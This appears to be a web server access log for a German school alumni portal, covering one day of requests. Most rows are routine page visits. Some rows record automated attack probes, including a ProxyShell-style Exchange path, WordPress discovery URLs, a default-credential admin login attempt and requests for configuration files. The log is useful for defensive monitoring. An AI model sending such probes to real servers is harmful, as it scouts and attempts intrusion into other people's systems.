user;timestamp;referer;target;method;status
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-30 10:12:12;;/info/;GET;404
1d4a6f377ba68d98baf84206970f49b639bca3f5b65f970ac0ae9766e5a84222;2025-11-30 10:12:12;;/geoserver/web/;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-30 10:12:16;;/info/;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-30 10:12:21;;/test;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-30 10:12:23;;/test;GET;404
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 10:19:35;/personen/alumni/schule/5503;/personen/alumni/schule/59043;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 10:20:59;/personen/alumni/schule/5503;/personen/alumni/schule/40745;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-30 10:22:28;/personen/alumni/details/olaf-schaeffer;/personen/alumni/details/olaf-schaeffer;GET;200
27332f6034214e79adf34fe891cf7dab739361371ca58dbb9f4ddebab5a032a0;2025-11-30 10:22:33;;/personen;GET;200
15a77adf4d87dc11e91cae0e1d5ef2ace98110b3822550c8c75beeddc8c3602c;2025-11-30 10:22:48;;/aktuelles/stellenangebote;GET;200
67189deb2a73e4254a1aaf4d9c38eefb807f518964f5ec6675069f42b4bc0fe6;2025-11-30 10:23:03;;/themen/details/der-start-ins-studium;GET;200
f3bf9d3954c9872387ea504efab533bc4ceb0d3d2797fff0797bff6015fcc5e4;2025-11-30 10:23:19;;/themen/details/abschied-aus-moabit;GET;200
27332f6034214e79adf34fe891cf7dab739361371ca58dbb9f4ddebab5a032a0;2025-11-30 10:23:34;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
10e54bc83aaa02def5a85ee42fe7d9b6203a9b6e7d9c0c7fafc3e0b91e79b101;2025-11-30 10:23:39;/;/;GET;200
7beab24c308120341f698ac436b5efe29a298825e09c85b43a0a69b65444eced;2025-11-30 10:23:49;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
925e5be256eb612e4c492898378712e7fc8e78900fe663cfe1364e9419c03a9d;2025-11-30 10:24:05;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
14344eabfdaa0af09eadfea89fd357f5c34ebfaf9f1bd631f7a1484013fd6356;2025-11-30 10:24:28;;/;GET;200
dd7b75a5cdfac6a6eedab8344c144956b22af0c9212c5fc6967ccce17508e531;2025-11-30 10:25:08;;/media/cache/avatar_sm/images/user/20.jpeg;GET;404
1d683395a12b937c707c15a095a73adfe2f41ee3d2d8799b20191c779bbf3937;2025-11-30 10:25:08;;/sitemap.xml;GET;200
3f1daae1a4e9c517ed8ef93173932473f6eebe8d0183ad8c4b4e2e8bdbd18229;2025-11-30 10:35:20;;/;GET;200
2153832cd87a7c2bede2290b67e8b5b932279e141c3447874d55605a57f6c100;2025-11-30 10:44:11;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
007ce04e51f00afe0c01d7ebc534f1ace62376b20f932b156b7147a7bd6eb6e3;2025-11-30 10:55:56;;/themen/details/der-start-ins-studium;GET;200
5270a16d7888b13c2459a59d3e6cb5ff017fbfa2df67c0519ef9c31b907a76fe;2025-11-30 11:02:55;;/personen/alumni/schule/5506;GET;200
6c25216039fe6eb310922ed4754067f62fba1b9bfecc3c811b64d951f17c15a2;2025-11-30 11:13:36;/;/;GET;200
05f63f0e1e1153fa7c5419f0c7043132b3e6c6abd057f81fd7b7952ce49b9eb9;2025-11-30 11:18:10;;/;GET;200
ea434a6cbff4843e80eaf52eb5ef05305d5b2c7ef5e635bb50cbb597dab5df83;2025-11-30 11:18:23;;/;GET;200
f1b9231857b0d3585bb64cb847cc999d70e12bb0672fd9bedbf58229f28b860a;2025-11-30 11:20:53;;/themen?category=kultur;GET;200
2e5524b039843f15c3474aeac0be0ac76fd5d063417939cb41071513ba9d26ac;2025-11-30 11:27:51;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-30 11:31:38;;/?XDEBUG_SESSION_START=phpstorm;GET;200
e8b3eefc24fd73bd60d872b5caa2c3a26caa3d4066ca09240104eeecc5a7b138;2025-11-30 11:33:00;/;/;GET;200
94820928a698b96f44fc384f5a08a3f72e9766c0fdf9c0bea9e7d56f97846962;2025-11-30 11:39:48;;/personen/alumni/schule/190627;GET;200
3c9e99393cb928b32711f81e2f04bc81ab32b2c517b3161e4eb8dc50eb774da4;2025-11-30 11:41:44;;/;GET;200
11b9c12ee2382a7db1bc816b512f200420de4f836530fddcb2104ad6be11ac7c;2025-11-30 11:45:58;/;/;GET;200
512f29edf16f6be7febe2a2e14a32f291b21f4325cc0aa3986dcff60210bf817;2025-11-30 11:53:34;;/themen/details/was-kommt-nach-dem-abitur;GET;200
110a296d6273f2229d22716bb45e5a1f0574bb29dd1d2728b90a2ad8e1ed36c7;2025-11-30 11:56:52;/;/;GET;200
1d683395a12b937c707c15a095a73adfe2f41ee3d2d8799b20191c779bbf3937;2025-11-30 11:56:57;/sitemap.xml;/sitemap.xml;GET;200
108c72c7806537a0b351f828069f94baadec47b4f2999020cbda68ab739da8a1;2025-11-30 12:06:41;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
2e5d7ca58a6dafe954ed0008b232a6d174b3b63b19f01e9e2e7e4609b2da3a9d;2025-11-30 12:06:47;;/gruppen/hobby/abschlussfest;GET;302
0f8c88a14efbdb28bd5e766591bd54330de0e3aa960ce251ac2a2dbbe34b7df0;2025-11-30 12:06:48;;/gruppen/hobby/theater-und-schauspiel;GET;302
02b9246dee856d49075b7f0dad883fd07f0db3c0d122294c6075547a8b3a7f41;2025-11-30 12:06:54;;/themen/details/david-gegen-goliath;GET;200
b2685eb00605d116d3155e33149e176a80507b0a0820205fa870c1b6a4d5b21d;2025-11-30 12:16:23;/;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 12:18:04;/gruppen/hobby/grafikdesign;/gruppen/hobby/podcasting;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 12:18:04;/gruppen/hobby/grafikdesign;/gruppen;GET;200
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:08;;/;GET;200
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:09;;/odinhttpcall1764501488;GET;404
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:09;;/HNAP1;GET;404
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:09;;/evox/about;GET;404
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:09;;/;GET;200
e3cc5c545171844cc444985807ef2fcaa439e6c445cb915ec7df022135b6f343;2025-11-30 12:18:09;;/;GET;200
0ace16d7abb6da5e5bc0ad1e05fad15768d7a7b2ae3f2d1365a6cdd88ae44966;2025-11-30 12:18:09;;/;GET;200
304970c76600f6feb29f7d04063431387af3c187fecfa621aa74e697e4f1c364;2025-11-30 12:18:10;;/;GET;200
a343168489f51882b60db1706456df37b4ec1056c3e43aa20c1aaf93ec0c3179;2025-11-30 12:24:24;;/ndp/adminlogin.php?Username=tac&Password=tac&Submit=Login&SsoVendor=&SsoIdToken=;GET;404
c32095dbf88e168edfafb04fa70765a19505724e441fa99c23e1595ebd7eb445;2025-11-30 12:24:50;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
a343168489f51882b60db1706456df37b4ec1056c3e43aa20c1aaf93ec0c3179;2025-11-30 12:26:28;;/ndp/adminlogin.php?Username=tac&Password=tac&Submit=Login&SsoVendor=&SsoIdToken=;GET;404
a714c4af0854398564625ab4a5f6d3b1149be2d6a862aed76c54c85484f96c1f;2025-11-30 12:28:20;;/actuator/health;GET;404
859149048fafdb8a09f9e61c28fe96ce69ae964182842719c739782774cc4c5d;2025-11-30 12:33:48;;/gruppen/hobby/physik;GET;302
ba86bca2c19de537138caa150d304fc6905c268c2b4ecd5c49bafb9414e9d518;2025-11-30 12:33:52;;/gruppen/hobby/chor;GET;302
572f6bba7b214b3f5f63e89a63bf25ca0d2e3030f167e0c9399725141c0a91f9;2025-11-30 12:33:56;;/gruppen/hobby/finanzbildung;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 12:41:55;/personen/alumni/schule/5503;/profile;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 12:41:56;/personen/alumni/schule/5503;/login;GET;200
8de4ddd7672a54a66eebd204c7a5271e8491caa3d60519a170e0057c4aa1ff5d;2025-11-30 12:45:33;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-30 12:46:52;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
4d5e1c1c4f0447a4ec37c356977ea246da9a30312f39c9c22b8da47b0ce48971;2025-11-30 12:47:06;;/personen/alumni/schule/HS001;GET;200
ed349bcef0b3ec067ccc79965e82f63b4c87aec15106de9a2d821464bd7b548c;2025-11-30 12:50:00;;/personen/alumni/details/andie-jahnke;GET;200
dabefaf12b650d0010fe4bd2bacb5542b6fa2976cfcba2b2e8efe1a1ee51bed9;2025-11-30 12:50:30;/;/;GET;200
40be7163c8da0c36f2e3b5ebbe3e8edb2826869e6560d92aa483e90d6430ff74;2025-11-30 12:54:08;;/;GET;200
589c86fdbfa345f054406b3adc236077ccdc6629a445816802a85c52bed98c6c;2025-11-30 12:54:41;;/;GET;200
b7217d69e8d0115bb190e4e14c6e43253cdf077156dab449d4a7433c7996b23e;2025-11-30 12:57:01;;/admin/config.php;GET;404
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-30 12:58:19;;/actuator/gateway/routes;GET;404
7d3ab74a69f5a34a6dd0a31224e40edfbeac796657a02d5a8ddc627377e62ce8;2025-11-30 12:59:16;/;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 13:00:33;/gruppen/hobby/grafikdesign;/gruppen/hobby/philosophie;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 13:00:35;/gruppen/hobby/grafikdesign;/gruppen;GET;200
4aa8df7136d28c1387b1b1c53ad316b75cf6af392679af708effb0165394f5a1;2025-11-30 13:10:18;;/personen/alumni/schule/191073;GET;200
20170fe2a4fb586baecfaad898dd1fa741252163f4d6cc3680520723eb7f3631;2025-11-30 13:10:58;;/.well-known/traffic-advice;GET;404
8096669b65105024b6b4baa584346558785f46d26a9804225e9d6bcbde7198e7;2025-11-30 13:10:58;;/personen/alumni/details/thomas-matzig;GET;200
7e245226f47e4d724cdb77d037bb8bb64cd0c332e7d7a511630965c0d989097b;2025-11-30 13:11:04;;/;GET;200
7733266a889377fec7938821e313ff005753c6aad3194440e42f565b49161e2c;2025-11-30 13:11:06;;/gruppen/interesse/gesundheitswesen-und-pflege;GET;200
dc4fca78bed40450d8cf9bc1ffaeebdcc909c0e96e640ce74e57185b9de87d97;2025-11-30 13:15:13;;/;GET;200
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/;GET;200
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/odinhttpcall1764504937;GET;404
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/HNAP1;GET;404
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/evox/about;GET;404
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/;GET;200
770d0dc7cc24fd5d06ff6a1cb779bf7b9dc8574f58d2fe0080c09019aeb41914;2025-11-30 13:15:37;;/;GET;200
18d9b5baf13bcecb318e9e8921401b900a7198a95c336970b18e2795d384c109;2025-11-30 13:15:37;;/;GET;200
dab6a0ee09a073b8cf90bb7120ed3c337246662b43cd6a59587b10086ae413e8;2025-11-30 13:15:39;;/;GET;200
24a47a83c7e4eb8fc5670b19da0e7d65a2d0ddbc9ae8f62c8065cef0110fb108;2025-11-30 13:22:03;;/;GET;200
c90980ca215a08e6628f442e68c278412262abd0b38bdfdacd05594ec2a6bb40;2025-11-30 13:25:46;;/;GET;200
d39f9ebb207ba5fa0fa7d362c0c941f6434d875a3dc182334ab2b3af762fcaf7;2025-11-30 13:32:24;;/personen/alumni/schule/5826;GET;200
bd34ec63947d73e00f0f626ad1af971d73002cd9f547a5b0663089d4aea886ec;2025-11-30 13:32:49;;/gruppen/interesse/teamarbeit;GET;200
303f83ba7f73ded0269403469ebbaf4e7579318eb5f693d1cae74974b8a10663;2025-11-30 13:32:52;;/gruppen/interesse/entrepreneurship;GET;200
39878d4c85ffcfa83ed7874b6bab5ed6892dab889f1f67e667b8a63b66a3a981;2025-11-30 13:34:41;;/;GET;200
fb2e82484314f079b117b7b70efbbab8f3aafb01fe135f123af17b36af69b890;2025-11-30 13:37:56;;/;GET;200
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:13;;/;GET;200
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:14;;//wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:14;;//xmlrpc.php?rsd;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:15;;/;GET;200
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:15;;//blog/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:15;;//web/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:15;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:16;;//website/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:16;;//wp/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:16;;//news/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:16;;//2018/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:16;;//2019/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:17;;//shop/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:17;;//wp1/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:17;;//test/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:17;;//media/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:17;;//wp2/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:18;;//site/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:18;;//cms/wp-includes/wlwmanifest.xml;GET;404
53a8048fd1037d2fbebecd1e485a16650ac4657fe5cc713daa337746b598900e;2025-11-30 13:41:18;;//sito/wp-includes/wlwmanifest.xml;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 13:47:09;/personen/alumni/schule/5503;/personen/alumni/schule/67945;GET;200
bef6848d851ec143f4d56cbca946a27f19ae05207808b73ed7fec3c9338f27ba;2025-11-30 13:55:19;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
0410cc5726850d06e131fd54d0f61d2541468c5b204931badfb734151757bb74;2025-11-30 14:09:08;;/;GET;200
18e934c954535e3a67979443f450a58b3fc585de02541bb19d9909842542e5fc;2025-11-30 14:09:25;;/;GET;200
54e728aece7e345c898705d72640384e2d9f43d13523c8defa58a38e86cce44d;2025-11-30 14:09:26;;/;GET;200
8e98fcbac604bbc8026d014d5440087304acbcd5ae4896c635aa007f62f84dea;2025-11-30 14:10:31;;/personen/all/3;GET;200
49d85cf09c99ba0e31e1b09de0ea4b390f5d11561e27f5f38525588ae728820e;2025-11-30 14:10:35;;/gruppen/interesse/kundenbetreuung-und-beratung;GET;200
a6e464f602c4af968b07872cf2097b9aad68ac865bbc873f07fe389a12612dbd;2025-11-30 14:10:39;;/gruppen/interesse/selbststandigkeit;GET;200
aca2d427548012d36b73353bcf65aa95241c3fdc0eb57452a211f20dfb73ca46;2025-11-30 14:10:43;;/gruppen/hobby/geometrie;GET;302
878a3afd434c66e68595140ac9a65057519013dc0fc3c5bfd64a2e7c74b3e73c;2025-11-30 14:10:44;;/admin/config.php;GET;404
8386c982bbb3c5b7ae8e8480fa7322258ed2321e08c5bfad1672f45477b96d0d;2025-11-30 14:10:46;;/gruppen/hobby/skulptur;GET;302
c160af3b6117cdfb06ffed0eb5b47ee2f724eee1adaf60217bf6d3db202fdf67;2025-11-30 14:10:54;;/gruppen/hobby/elektronikbasteln;GET;302
29fb9ef46b9deff981d36fe1bee306b1a18e5c77ccec2b79e62403a0c4fe02b0;2025-11-30 14:11:47;;/themen/details/der-start-ins-studium;GET;200
c39033a4db53cb73bc2a62f06d408a13f3f9ac6ddeea8ee5e12ce2aeae10cda2;2025-11-30 14:12:15;;/themen/details/abschied-aus-moabit;GET;200
c39033a4db53cb73bc2a62f06d408a13f3f9ac6ddeea8ee5e12ce2aeae10cda2;2025-11-30 14:13:08;;/personen;GET;200
9545c81adbb78868bd26f153d9525fce2cc6ac856f25454ca71af7b9addc0c75;2025-11-30 14:13:17;;/aktuelles/stellenangebote;GET;200
c823138d25c729dfae88f53eba11f6c323cd2b57ad25218f5cf9fc1bd51fb79d;2025-11-30 14:13:32;;/themen/details/der-start-ins-studium;GET;200
2f38f1e734cc2f7e3efcc7e1aea7e2aa2eb2da170db57cc5a7a42abc5c334f4b;2025-11-30 14:15:02;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
9545c81adbb78868bd26f153d9525fce2cc6ac856f25454ca71af7b9addc0c75;2025-11-30 14:15:15;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-30 14:16:36;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 14:18:46;/gruppen/hobby/grafikdesign;/gruppen/hobby/schreinern-und-bauen;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 14:18:47;/gruppen/hobby/grafikdesign;/gruppen;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 14:36:45;/personen/alumni/details/jeanette-stephan;/personen/alumni/details/jeanette-stephan;GET;200
a9a5d728ca440e55c6d81eb856dddedb2945051e63d1b0fdaafed11a8b5bc6ae;2025-11-30 14:45:07;;/assets/jquery-file-upload/server/php/index.php?file=tf2rghf.jpg;GET;404
f0708e4212eb78741f5139e5aea95d8af046313a6759ab316537048907e601f2;2025-11-30 14:46:11;;/personen/alumni/schule/5506;GET;200
71bcc76daa2f29cbf39823aebef24e24a5fc2b19657749e09c176931e2cf9873;2025-11-30 14:46:36;;/;GET;200
737918069996e58d3b3836ae552886f7c3ed63e031ffd65adcfcca529d932799;2025-11-30 15:04:08;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 15:04:34;/gruppen/hobby/grafikdesign;/gruppen/hobby/robotik;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 15:04:35;/gruppen/hobby/grafikdesign;/gruppen;GET;200
b595143d14e1973e27a8ef3bde100c9ea89e95a0231c6ddf8fc67b7659f080f4;2025-11-30 15:08:28;;/gruppen/hobby/statistik;GET;302
8f396eeda72715f30d5e26e0f497cd87ebdebb9a81593fde815467ed7d0ad014;2025-11-30 15:08:29;;/gruppen/hobby/philosophie;GET;302
de708e2683a64747b9ae7cf40f0795d6d1a189ef1f62ce8fccfe9b17aca2d647;2025-11-30 15:09:00;;/;GET;200
18428a84116f8cd8abbd84d94f57800636a899f4952a1dfab4c803302653ab21;2025-11-30 15:09:24;;/personen/alumni/schule/190627;GET;200
039b0e0e40e11331d6fa3194a8ba468b27db9da69e1c27068faf05aea7c35052;2025-11-30 15:14:19;;/;GET;200
a31306057511df7b34d97fd6c9e5a608d345b53bf166636bd319fb37f20d0b7f;2025-11-30 15:20:54;;/;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 15:22:15;/personen/all/2;/personen/all/4;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 15:23:38;/gruppen/hobby/grafikdesign;/gruppen/hobby/literaturanalyse;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 15:23:40;/gruppen/hobby/grafikdesign;/gruppen;GET;200
b59dc1479c01cfab70d976e5c09b1e3144f9fb8ee45614bde92fa15a86ed6788;2025-11-30 15:29:15;;/;GET;200
18465003bf08a02c148c944121bcfffef736ca74d9737b3448024c28f0896ed6;2025-11-30 15:31:53;;/personen/alumni/schule/HS001;GET;200
72cce75e53c77717dba548116856fa2182be72980313a5b938eacc7a56065ca4;2025-11-30 15:33:53;;/config.json;GET;404
8bcf13ba5c68c8fbc6e77ca46ea73503ba8b8b288324630cfb610d5ceb34532a;2025-11-30 15:36:23;;/;GET;200
516e53490dc20b8d7f7495601f8e48a9b774dc71f091f0f30ff41cb6358f0313;2025-11-30 15:44:12;;/;GET;200
ed179e1bac28674c703228cb82401e28cf5b1b1a6d7eccaf4311f3e0c4739641;2025-11-30 15:51:36;;/veranstaltungen/details/wartende-das-theaterstuck;GET;200
5ffa729dedb192e4e9a281356e44a382481aaf132f657968a94f9db8e9d9245a;2025-11-30 15:54:58;;/personen/alumni/schule/67945;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 15:56:46;/themen/details/bucher-auf-dem-abstellgleis;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 15:58:10;/personen/alumni/schule/5503;/personen/alumni/schule/59000;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 15:59:32;/personen/alumni/schule/5503;/personen/alumni/schule/610021;GET;200
4d5353815b37268c5b44cfa80e814a81d49b93cd18155f29be362b33eaba445c;2025-11-30 16:01:09;;/rechtliches/impressum;GET;200
d6916e0d3021e056e8c27691f38087d2a463edbaf58d1d06204bc0981df4d80a;2025-11-30 16:03:49;;/gruppen/hobby/einzelsportarten;GET;302
fd688db8337e8042f8f6b3f1d272a3be7713e126535c29500859847bf1d5f22b;2025-11-30 16:03:55;;/gruppen/hobby/astronomie;GET;302
ca2b29aee4021106773adb73e10841ca50fad8765a39c72a2eb3c63560be4f4a;2025-11-30 16:03:58;;/gruppen/hobby/diy-projekte;GET;302
909f96210057f8ed595075c7810c32d03b06da71fd6e1ecfc4b9bb77b90ea023;2025-11-30 16:04:44;;/.well-known/security.txt;GET;404
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-30 16:05:24;/;/;GET;200
01484fc6d37f8033c5d494337e6460e18fb4bdb359d8ef4e51969cf0332d0ff9;2025-11-30 16:05:58;;/;GET;200
669c2d69a2aee255d3b6518ef9cd2617cf0ae59acf234a33d83314693952a9a1;2025-11-30 16:08:32;;/;GET;200
bcd43ff0e1858744887e75cc7adc82ce997523f726b3630513091f47cf4a5634;2025-11-30 16:14:07;;/;GET;200
ee28776edf52e5daaa0842a1efaee536b8bd05cf0e58f6b6f314aee12a46cf1b;2025-11-30 16:17:38;;/;GET;200
ee28776edf52e5daaa0842a1efaee536b8bd05cf0e58f6b6f314aee12a46cf1b;2025-11-30 16:17:39;;/;GET;200
bcd43ff0e1858744887e75cc7adc82ce997523f726b3630513091f47cf4a5634;2025-11-30 16:18:14;;/;GET;200
bcd43ff0e1858744887e75cc7adc82ce997523f726b3630513091f47cf4a5634;2025-11-30 16:18:14;;/;GET;200
332093e1226e33c7a31ecfd2a211e4a44a065e8eb2294bb9a1afc2eeccad2e77;2025-11-30 16:19:37;;/;GET;200
734d0094bacbf4477f6eb13dd5cc481d053f81a377262476cdf519c96d8bd19b;2025-11-30 16:21:41;;/gruppen/hobby/yoga-und-meditation;GET;302
